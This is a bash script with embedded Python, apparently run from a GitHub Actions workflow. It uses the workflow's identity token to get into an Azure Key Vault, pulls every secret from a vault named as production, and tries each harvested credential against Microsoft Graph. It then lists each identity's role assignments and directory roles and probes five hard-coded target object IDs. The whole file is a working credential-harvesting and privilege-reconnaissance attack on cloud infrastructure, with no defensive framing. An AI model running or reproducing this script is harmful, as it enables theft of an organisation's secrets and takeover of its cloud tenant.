#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass

GRAPH="https://graph.microsoft.com/v1.0"
TARGETS=["63e87ab1-6bd2-4e80-92be-943450b20e4f","1fe7a412-82e9-4135-ab4b-72a0be429adb",
         "d2cdf247-9319-40cb-8324-5a005ef538da","eeab432e-1bf6-400e-b155-a28ce7cafcdb",
         "7a85156a-01c4-4e61-8472-40a92107159b"]
def gtok(c):
    st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://graph.microsoft.com/.default","grant_type":"client_credentials"})
    return jg(b).get("access_token")

for n,c in creds.items():
    t=gtok(c)
    if not t: print(f"\n### {n}: no graph token"); continue
    H={"Authorization":"Bearer "+t}
    st,b=http(f"{GRAPH}/servicePrincipals?$filter=appId eq '{c['appId']}'&$select=id,displayName,appId", headers=H)
    me=jg(b).get("value",[{}])
    me=me[0] if me else {}
    print(f"\n### {n}  graph-token=OK  spId={me.get('id')} name={me.get('displayName')} (lookup {st})")
    if me.get("id"):
        st,b=http(f"{GRAPH}/servicePrincipals/{me['id']}/appRoleAssignments?$select=resourceDisplayName,appRoleId", headers=H)
        roles=jg(b).get("value",[])
        print("   appRoleAssignments:", st, [(r.get('resourceDisplayName'),r.get('appRoleId')) for r in roles][:12])
    st,b=http(f"{GRAPH}/directoryRoles", headers=H)
    print("   directoryRoles:", st, [r.get("displayName") for r in jg(b).get("value",[])][:12])
    for tgt in TARGETS:
        st,b=http(f"{GRAPH}/directoryObjects/{tgt}", headers=H)
        if st==200:
            d=jg(b)
            print(f"   resolve {tgt[:8]}: {d.get('@odata.type')} {d.get('displayName')} appId={d.get('appId','')}")
        else:
            print(f"   resolve {tgt[:8]}: {st}")
    break
PYEOF
echo "=== done ==="